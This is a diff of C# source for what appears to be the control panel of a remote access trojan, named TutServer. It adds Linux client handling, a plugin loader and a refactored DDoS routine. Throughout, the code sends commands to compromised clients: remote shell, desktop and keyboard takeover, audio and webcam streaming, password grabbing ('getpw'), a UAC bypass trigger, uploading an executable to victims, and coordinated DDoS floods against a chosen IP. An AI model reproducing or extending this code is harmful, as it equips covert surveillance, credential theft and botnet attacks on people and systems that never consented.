+            rp.Close();
+        }
+
+        private delegate void EnableButtonCallback(Button button, bool state);
+
+        private void EnableButton(Button button, bool state)
+        {
+            if (InvokeRequired)
+            {
+                EnableButtonCallback ebc = new EnableButtonCallback(EnableButton);
+                Invoke(ebc, new object[] { button, state });
+                return;
+            }
+
+            button.Enabled = state;
+        }
+
+        struct ClientObject
+        {
+            public byte[] buffer;
+            public Socket s;
+        }
+
+        private void CheckLinux(object data)
+        {
+            ClientObject obj = (ClientObject)data;
+            byte[] buffer = obj.buffer;
+            string command = Encoding.ASCII.GetString(buffer);
+            if (command == "linuxClient")
+            {
+                //Handle Linux Clients
+                Console.WriteLine("Linux Client detected!");
+                int socketID = getSocket(obj.s);
+                if (lcm != null)
+                {
+                    lcm.AddAssociation(socketID);
+
+                }
+                else
+                {
+                    Console.WriteLine("CheckLinux, lcm was null");
+                }
+            }
+        }
 
         private delegate void SortListC(ListView lv);
 
@@ -1064,7 +2037,7 @@ namespace TutServer
             {
                 String command = "fdir§" + directory;
                 loopSend(command);
-                current_path = directory;
+                Current_Path = directory;
                 listView3.Items.Clear();
             }
         }
@@ -1231,10 +2204,10 @@ namespace TutServer
 
         private void button1_Click(object sender, EventArgs e)
         {
-            if (!isStartedServer)
+            if (!IsStartedServer)
             {
                 SetupServer();
-                isStartedServer = true;
+                IsStartedServer = true;
                 button1.Text = "Terminate Server";
                 if (reScanTarget)
                 {
@@ -1264,7 +2237,7 @@ namespace TutServer
                 }
                 return;
             }
-            if (isStartedServer)
+            if (IsStartedServer)
             {
                 CloseAllSockets();
                 label1.Text = "Server is offline";
@@ -1324,7 +2297,7 @@ namespace TutServer
             catch (Exception)
             {
                 //plain text?
-                Console.WriteLine("Decrypt error");
+                Console.WriteLine("Decrypt error " + cipherText);
                 return cipherText;
             }
         }
@@ -1342,6 +2315,9 @@ namespace TutServer
                 }
 
                 controlClients = clients.ToArray();
+                sCore.RAT.ServerSettings.currentClient = controlClients[0];
+                akaigVersion = "";
+                sendCommand("getstart", clients[0]);
             }
         }
 
@@ -1350,13 +2326,24 @@ namespace TutServer
 
             Socket s = _clientSockets[targetClient];
 
+            if (lcm.IsLinuxClient(s))
+            {
+                lcm.SendCommand(command, targetClient);
+                return;
+            }
+
             try
             {
                 String k = command;
 
                 String crypted = Encrypt(k);
-                byte[] data = System.Text.Encoding.Unicode.GetBytes(crypted);
-                s.Send(data);
+                byte[] data = Encoding.Unicode.GetBytes(crypted);
+                String header = crypted.Length.ToString() + "§";
+                byte[] byteHeader = Encoding.Unicode.GetBytes(header);
+                byte[] fullBytes = new byte[byteHeader.Length + data.Length];
+                Array.Copy(byteHeader, fullBytes, byteHeader.Length);
+                Array.ConstrainedCopy(data, 0, fullBytes, byteHeader.Length, data.Length);
+                s.Send(fullBytes);
             }
             catch (Exception)
             {
@@ -1638,42 +2625,48 @@ namespace TutServer
             loopSend(cmd);
             textBox4.Clear();
             System.Threading.Thread.Sleep(1000);
+            listView2.Items.Clear();
             loopSend("proclist");
         }
 
         private void button15_Click(object sender, EventArgs e)
         {
-            if (!isCmdStarted)
+            if (!IsCmdStarted)
             {
                 String command = "startcmd";
                 loopSend(command);
-                isCmdStarted = true;
+                IsCmdStarted = true;
                 button15.Text = "Stop Cmd";
             }
             else
             {
                 String command = "stopcmd";
                 loopSend(command);
-                isCmdStarted = false;
+                IsCmdStarted = false;
                 button15.Text = "Start Cmd";
             }
         }
 
         private void textBox5_KeyDown(object sender, KeyEventArgs e)
         {
-            if (e.KeyCode == Keys.Return && isCmdStarted)
+            if (e.KeyCode == Keys.Return && IsCmdStarted)
             {
                 String command = "cmd§" + textBox5.Text;
-                if (command == "cmd§cls") richTextBox2.Clear();
                 textBox5.Text = "";
+                if (command == "cmd§cls" || command == "cmd§clear")
+                {
+                    richTextBox2.Clear();
+                    return;
+                }
+
                 if (command == "cmd§exit")
                 {
-                    DialogResult result = MessageBox.Show(this, "Do you qant to exit the remote cmd?", "Warning", MessageBoxButtons.YesNoCancel, MessageBoxIcon.Question);
+                    DialogResult result = MessageBox.Show(this, "Do you want to exit the remote cmd?", "Warning", MessageBoxButtons.YesNoCancel, MessageBoxIcon.Question);
                     if (result == DialogResult.Yes)
                     {
                         loopSend("stopcmd");
                         button15.Text = "Start Cmd";
-                        isCmdStarted = false;
+                        IsCmdStarted = false;
                         return;
                     }
                     else if (result == DialogResult.Cancel)
@@ -1683,7 +2676,7 @@ namespace TutServer
                 }
                 loopSend(command);
             }
-            else if (e.KeyCode == Keys.Return && !isCmdStarted)
+            else if (e.KeyCode == Keys.Return && !IsCmdStarted)
             {
                 MessageBox.Show(this, "Cmd Thread is not started!", "Warning", MessageBoxButtons.OK, MessageBoxIcon.Warning);
             }
@@ -1707,7 +2700,7 @@ namespace TutServer
                 String fullPath = listView3.SelectedItems[0].SubItems[3].Text;
                 String command = "fdir§" + fullPath;
                 loopSend(command);
-                current_path = fullPath;
+                Current_Path = fullPath;
                 listView3.Items.Clear();
             }
             else
@@ -1718,12 +2711,12 @@ namespace TutServer
 
         private void toolStripMenuItem1_Click(object sender, EventArgs e)
         {
-            if (current_path == "drive")
+            if (Current_Path == "drive")
             {
                 MessageBox.Show(this, "Action cancelled!", "You are at the top of the file tree!", MessageBoxButtons.OK, MessageBoxIcon.Warning);
                 return;
             }
-            String cmd = "f1§" + current_path;
+            String cmd = "f1§" + Current_Path;
             loopSend(cmd);
         }
 
@@ -1732,7 +2725,7 @@ namespace TutServer
             Application.DoEvents();
             System.Threading.Thread.Sleep(1500);
             listView3.Items.Clear();
-            String cmd = "fdir§" + current_path;
+            String cmd = "fdir§" + Current_Path;
             loopSend(cmd);
         }
 
@@ -1758,7 +2751,7 @@ namespace TutServer
 
         private void currentDirectoryToolStripMenuItem_Click(object sender, EventArgs e)
         {
-            String cmd = "fpaste§" + current_path + "§" + xfer_path + "§" + xfer_mode;
+            String cmd = "fpaste§" + Current_Path + "§" + xfer_path + "§" + xfer_mode;
             loopSend(cmd);
             refresh();
         }
@@ -1884,7 +2877,7 @@ namespace TutServer
 
         private void fileToolStripMenuItem_Click(object sender, EventArgs e)
         {
-            String path = current_path;
+            String path = Current_Path;
             String name = "";
             bool validOperation = false;
             if (InputBox("New File", "Please enter the name and extension for the new file!", ref name) == DialogResult.OK)
@@ -1899,7 +2892,7 @@ namespace TutServer
 
         private void directoryToolStripMenuItem_Click(object sender, EventArgs e)
         {
-            String path = current_path;
+            String path = Current_Path;
             String name = "";
             bool validOperation = false;
             if (InputBox("New Directory", "Please enter the name for the new directory!", ref name) == DialogResult.OK)
@@ -1938,7 +2931,7 @@ namespace TutServer
 
         private void currentDirectoryToolStripMenuItem1_Click(object sender, EventArgs e)
         {
-            String dir = current_path;
+            String dir = Current_Path;
             String file = "";
             OpenFileDialog ofd = new OpenFileDialog();
             if (ofd.ShowDialog() == DialogResult.OK) file = ofd.FileName;
@@ -1985,6 +2978,13 @@ namespace TutServer
         private void Form1_FormClosing(object sender, FormClosingEventArgs e)
         {
             if (_clientSockets.Count > 0) CloseAllSockets();
+            if (sh != null)
+            {
+                foreach (IPluginMain ipm in sh.runningPlugins)
+                {
+                    ipm.OnExit();
+                }
+            }
         }
 
         private void button16_Click(object sender, EventArgs e)
@@ -2009,8 +3009,8 @@ namespace TutServer
 
         private void button21_Click(object sender, EventArgs e)
         {
-            multiRecv = true;
-            rdesktop = true;
+            MultiRecv = true;
+            RDesktop = true;
             loopSend("rdstart");
         }
 
@@ -2019,9 +3019,10 @@ namespace TutServer
             loopSend("rdstop");
             Application.DoEvents();
             System.Threading.Thread.Sleep(1500);
-            if (!austream && !wStream) multiRecv = false;
-            rdesktop = false;
-            isrdFull = false;
+            if (!AuStream && !WStream) MultiRecv = false;
+            RDesktop = false;
+            IsRdFull = false;
+            sCore.UI.CommonControls.remoteDesktopPictureBox = null;
             pictureBox1.Image.Dispose();
             pictureBox1.Image = null;
             if (Rdxref == null) return;
@@ -2039,7 +3040,7 @@ namespace TutServer
         private void pictureBox1_MouseMove(object sender, MouseEventArgs e)
         {
             System.Drawing.Rectangle scr = Screen.PrimaryScreen.WorkingArea;
-            if (!isrdFull)
+            if (!IsRdFull)
             {
                 scr = pictureBox1.DisplayRectangle;
             }
@@ -2078,6 +3079,8 @@ namespace TutServer
 
         private void checkBox1_CheckedChanged(object sender, EventArgs e)
         {
+            sCore.RAT.RemoteDesktop.canControlMouse = checkBox1.Checked;
+
             if (checkBox1.Checked)
             {
                 rmoveTimer = new Timer();
@@ -2130,6 +3133,8 @@ namespace TutServer
 
         private void checkBox2_CheckedChanged(object sender, EventArgs e)
         {
+            sCore.RAT.RemoteDesktop.canControlKeyboard = checkBox2.Checked;
+
             if (checkBox2.Checked)
             {
                 MessageBox.Show(this, "The remote keyboard feature only works in full screen mode!", "Warning", MessageBoxButtons.OK, MessageBoxIcon.Information);
@@ -2146,12 +3151,8 @@ namespace TutServer
             RDesktop full = new RDesktop();
             full.Show();
             Rdxref = full;
-            isrdFull = true;
-        }
-
-        private void button20_Click(object sender, EventArgs e)
-        {
-            only1 = true;
+            sCore.UI.CommonControls.remoteDesktopPictureBox = (PictureBox)full.Controls.Find("pictureBox1", true)[0];
+            IsRdFull = true;
         }
 
         public void executeToolStrip(String name)
@@ -2316,11 +3317,11 @@ namespace TutServer
         {
             if (listView4.SelectedItems.Count > 0)
             {
-                if (!austream)
+                if (!AuStream)
                 {
                     int deviceNumber = listView4.SelectedItems[0].Index;
-                    multiRecv = true;
-                    austream = true;
+                    MultiRecv = true;
+                    AuStream = true;
                     astream = new audioStream();
                     astream.init();
                     loopSend("astream§" + deviceNumber.ToString());
@@ -2328,16 +3329,16 @@ namespace TutServer
                     return;
                 }
 
-                if (austream)
+                if (AuStream)
                 {
                     loopSend("astop");
-                    if (!rdesktop && !wStream)
+                    if (!RDesktop && !WStream)
                     {
                         Application.DoEvents();
                         System.Threading.Thread.Sleep(1500);
-                        multiRecv = false;
+                        MultiRecv = false;
                     }
-                    austream = false;
+                    AuStream = false;
                     astream.destroy();
                     astream = null;
                     button25.Text = "Start Stream";
@@ -2352,37 +3353,33 @@ namespace TutServer
 
         private void button27_Click(object sender, EventArgs e)
         {
-            if (!wStream && listView5.SelectedItems.Count > 0)
+            if (!WStream && listView5.SelectedItems.Count > 0)
             {
                 String id = listView5.SelectedItems[0].SubItems[0].Text;
                 String command = "wstream§" + id;
-                multiRecv = true;
-                wStream = true;
+                MultiRecv = true;
+                WStream = true;
                 button27.Text = "Stop stream";
                 loopSend(command);
                 return;
             }
 
-            if (wStream)
+            if (WStream)
             {
-                if (!rdesktop && !austream)
+                if (!RDesktop && !AuStream)
                 {
                     Application.DoEvents();
                     System.Threading.Thread.Sleep(1500);
-                    multiRecv = false;
+                    MultiRecv = false;
                 }
-                wStream = false;
+                WStream = false;
                 button27.Text = "Start Stream";
                 loopSend("wstop");
             }
         }
 
-        private void button29_Click(object sender, EventArgs e)
+        private bool TestDDoS(string ip, string prot)
         {
-            if (textBox6.Text == "" || comboBox5.SelectedItem == null) return;
-            String ip = textBox6.Text;
-            String prot = comboBox5.SelectedItem.ToString();
-
             if (prot == "ICMP ECHO (Ping)")
             {
                 System.Net.NetworkInformation.Ping ping = new System.Net.NetworkInformation.Ping();
@@ -2390,10 +3387,12 @@ namespace TutServer
                 if (reply.Status == System.Net.NetworkInformation.IPStatus.Success)
                 {
                     MessageBox.Show(this, "Ping succes with 1 second timeout and 4 bytes of data (test)", "Target responded to ping", MessageBoxButtons.OK, MessageBoxIcon.Information);
+                    return true;
                 }
                 else
                 {
-                    MessageBox.Show(this, "Ping failed with 1 second timeout and 4 bytes of data (test)", "Target didnt responded to ping!", MessageBoxButtons.OK, MessageBoxIcon.Warning);
+                    MessageBox.Show(this, "Ping failed with 1 second timeout and 4 bytes of data (test)", "Target didn't responded to ping!", MessageBoxButtons.OK, MessageBoxIcon.Warning);
+                    return false;
                 }
             }
             if (prot == "TCP")
@@ -2405,15 +3404,18 @@ namespace TutServer
                     if (client.Connected)
                     {
                         MessageBox.Show(this, "Connection to " + ip + ":" + int.Parse(numericUpDown1.Value.ToString()) + " successed", "TCP DDoS test", MessageBoxButtons.OK, MessageBoxIcon.Information);
+                        return true;
                     }
                     else
                     {
                         MessageBox.Show(this, "Connection to " + ip + ":" + int.Parse(numericUpDown1.Value.ToString()) + " failed", "TCP DDoS test", MessageBoxButtons.OK, MessageBoxIcon.Warning);
+                        return false;
                     }
                 }
                 catch (Exception)
                 {
                     MessageBox.Show(this, "Connection to " + ip + ":" + int.Parse(numericUpDown1.Value.ToString()) + " failed", "TCP DDoS test", MessageBoxButtons.OK, MessageBoxIcon.Warning);
+                    return false;
                 }
             }
             if (prot == "UDP")
@@ -2425,23 +3427,29 @@ namespace TutServer
                     IPEndPoint ep = new IPEndPoint(IPAddress.Parse(ip), int.Parse(numericUpDown1.Value.ToString()));
                     client.Send(new byte[] { 0x0, 0x1, 0x2, 0x3 }, 4, ep);
                     MessageBox.Show(this, "Connection to " + ip + ":" + int.Parse(numericUpDown1.Value.ToString()) + " successed", "UDP DDoS test", MessageBoxButtons.OK, MessageBoxIcon.Information);
+                    return true;
                 }
                 catch (Exception)
                 {
                     MessageBox.Show(this, "Connection to " + ip + ":" + int.Parse(numericUpDown1.Value.ToString()) + " failed", "UDP DDoS test", MessageBoxButtons.OK, MessageBoxIcon.Warning);
+                    return false;
                 }
             }
+
+            return false;
         }
 
-        private void button28_Click(object sender, EventArgs e)
+        private void button29_Click(object sender, EventArgs e)
         {
-            bool isAllClient = checkBox3.Checked;
+            if (textBox6.Text == "" || comboBox5.SelectedItem == null) return;
             String ip = textBox6.Text;
-            String port = numericUpDown1.Value.ToString();
-            String protocol = comboBox5.SelectedItem.ToString();
-            String packetSize = numericUpDown2.Value.ToString();
-            String threads = numericUpDown3.Value.ToString();
-            String delay = numericUpDown4.Value.ToString();
+            String prot = comboBox5.SelectedItem.ToString();
+
+            TestDDoS(ip, prot);
+        }
+
+        private void StartDDoS(string ip, string port, string protocol, string packetSize, string threads, string delay, bool isAllClient)
+        {
             String command = "ddosr|" + ip + "|" + port + "|" + protocol + "|" + packetSize + "|" + threads + "|" + delay;
             if (isAllClient)
             {
@@ -2458,6 +3466,18 @@ namespace TutServer
                 loopSend(command);
                 label18.Text = "Status: DDoS Started [Client_Count:1 Target_IP:" + ip + " Target_Port:" + port + "]";
             }
+        }
+
+        private void button28_Click(object sender, EventArgs e)
+        {
+            bool isAllClient = checkBox3.Checked;
+            String ip = textBox6.Text;
+            String port = numericUpDown1.Value.ToString();
+            String protocol = comboBox5.SelectedItem.ToString();
+            String packetSize = numericUpDown2.Value.ToString();
+            String threads = numericUpDown3.Value.ToString();
+            String delay = numericUpDown4.Value.ToString();
+            StartDDoS(ip, port, protocol, packetSize, threads, delay, isAllClient);
         }
 
         private void button30_Click(object sender, EventArgs e)
@@ -2480,6 +3500,176 @@ namespace TutServer
         private void button31_Click(object sender, EventArgs e)
         {
             loopSend("getpw");
+        }
+
+        private void listView1_SelectedIndexChanged(object sender, EventArgs e)
+        {
+            //Declare info vars
+            string clientType = "";
+
+            //Determine client type
+            if (listView1.SelectedItems.Count == 0)
+            {
+                label2.Text = "Client Info";
+                return;
+            }
+            string strClient = listView1.SelectedItems[0].SubItems[0].Text;
+            strClient = strClient.Replace("Client ", String.Empty);
+            int clientID = int.Parse(strClient);
+            if (lcm != null)
+            {
+                if (lcm.IsLinuxClient(clientID)) clientType = "Linux Client";
+                else clientType = "Windows Client";
+            }
+
+            //Write data to label2 (Client Information)
+
+            label2.Text = "Client Type: " + clientType;
+        }
+
+        private void button33_Click(object sender, EventArgs e)
+        {
+            loopSend("uacbypass");
+        }
+
+        private void button20_Click(object sender, EventArgs e)
+        {
+            if (akaigVersion == "")
+            {
+                MessageBox.Show(this, "Unable to upload akaig", "No akaig version specified", MessageBoxButtons.OK, MessageBoxIcon.Warning);
+                return;
+            }
+            if (!File.Exists(Application.StartupPath + "\\external\\akaig" + akaigVersion + ".exe")) return;
+
+            fup_local_path = "external\\akaig" + akaigVersion + ".exe";
+            long akaigSize = new FileInfo(fup_local_path).Length;
+            uploadFinished = false;
+            string cmd = "fup§" + remStart + "\\akaig" + akaigVersion + ".exe§" + akaigSize;
+            loopSend(cmd);
+        }
+
+        private void button34_Click(object sender, EventArgs e)
+        {
+            string cmd = "startipc§tut_client_proxy";
+            remotePipe rp = new remotePipe("tut_client_proxy", this);
+            loopSend(cmd);
+            sCore.RAT.ExternalApps.ipcConnections.Add("tut_client_proxy", rp.outputBox);
+            rp.Show();
+            rPipeList.Add(rp);
+        }
+
+        public void RemovePipe(remotePipe obj, bool remote = true)
+        {
+            int rmid = 0;
+            bool canRemove = false;
+
+            foreach (remotePipe rp in rPipeList)
+            {
+                if (obj == rp)
+                {
+                    canRemove = true;
+                    break;
+                }
+                rmid++;
+            }
+
+            if (canRemove)
+            {
+                string sName = rPipeList[rmid].pname;
+                sCore.RAT.ExternalApps.ipcConnections.Remove(sName);
+                if (remote) loopSend("stopipc§" + sName);
+                rPipeList.RemoveAt(rmid);
+            }
+        }
+
+        private void listBox1_SelectedIndexChanged(object sender, EventArgs e)
+        {
+            if (listBox1.SelectedItem != null)
+            {
+                string plugin = listBox1.SelectedItem.ToString();
+                object[] pInfo = sh.GetPluginInfo(plugin);
+                label29.Text = "Name: " + pInfo[0].ToString();
+                label30.Text = "Version: " + pInfo[1].ToString();
+                label31.Text = "Author: " + pInfo[4].ToString();
+                label32.Text = "Description: " + pInfo[2].ToString();
+                comboBox6.Items.Clear();
+
+                Permissions[] ps = (Permissions[])pInfo[3];
+                foreach (Permissions p in ps)
+                {
+                    comboBox6.Items.Add(p.ToString());
+                }
+
+                if (comboBox6.Items.Count > 0) comboBox6.SelectedIndex = 0;
+            }
+            else
+            {
+                label29.Text = "Name: ";
+                label30.Text = "Version: ";
+                label31.Text = "Author: ";
+                label33.Text = "Description: ";
+                comboBox6.Items.Clear();
+            }
+        }
+
+        private void button37_Click(object sender, EventArgs e)
+        {
+            if (listBox1.SelectedItem != null)
+            {
+                //sh.ExecuteScript(listBox1.SelectedItem.ToString());
+                sh.ExecuteDll(listBox1.SelectedItem.ToString());
+            }
+            else
+            {
+                MessageBox.Show(this, "Script can't be executed", "No script selected");
+            }
+        }
+
+        private void button38_Click(object sender, EventArgs e)
+        {
+            listBox1.Items.Clear();
+            sh.LoadDllFiles();
+
+            label29.Text = "Name: ";
+            label30.Text = "Version: ";
+            label32.Text = "Description: ";
+            label31.Text = "Author: ";
+            comboBox6.Items.Clear();
+            comboBox6.Text = "";
+        }
+
+        private void button36_Click(object sender, EventArgs e)
+        {
+            if (listBox1.SelectedItem != null)
+            {
+                string scriptName = listBox1.SelectedItem.ToString();
+                if (sh.IsPluginRunning(scriptName)) ; //Stop plugin
+                File.Delete(Application.StartupPath + "\\scripts\\" + scriptName);
+                button38_Click(null, null);
+            }
+            else
+            {
+                MessageBox.Show(this, "No plugin selected", "Error!", MessageBoxButtons.OK, MessageBoxIcon.Error);
+            }
+        }
+
+        private void button35_Click(object sender, EventArgs e)
+        {
+            OpenFileDialog ofd = new OpenFileDialog();
+            ofd.Title = "Please Select A Valid Dll Pluing File";
+            ofd.DefaultExt = "Plugin Files (*.dll)|*.dll";
+            if (ofd.ShowDialog() == DialogResult.OK)
+            {
+                if (File.Exists(ofd.FileName))
+                {
+                    File.Copy(ofd.FileName, Application.StartupPath + "\\scripts\\" + new FileInfo(ofd.FileName).Name);
+                    button38_Click(null, null);
+                }
+                else
+                {
+                    MessageBox.Show(this, "Selected File doesn't exist", "Error!", MessageBoxButtons.OK, MessageBoxIcon.Error);
+                }
+            }
         }
     }
 
@@ -2781,7 +3971,7 @@ namespace TutServer
 
         private void onKeyDown(object sender, KeyEventArgs e)
         {
-            if (e.KeyCode == Keys.Return && Form1.isCmdStarted)
+            if (e.KeyCode == Keys.Return && Form1.IsCmdStarted)
             {
                 TextBox me = sender as TextBox;
                 if (me.Tag.ToString().Split('.')[2] == "rcmd")
@@ -2792,7 +3982,7 @@ namespace TutServer
                     f.loopSend(command);
                 }
             }
-            else if (e.KeyCode == Keys.Return && !Form1.isCmdStarted)
+            else if (e.KeyCode == Keys.Return && !Form1.IsCmdStarted)
             {
                 MessageBox.Show(Form1.me, "Cmd Thread is not started!", "Warning", MessageBoxButtons.OK, MessageBoxIcon.Warning);
             }
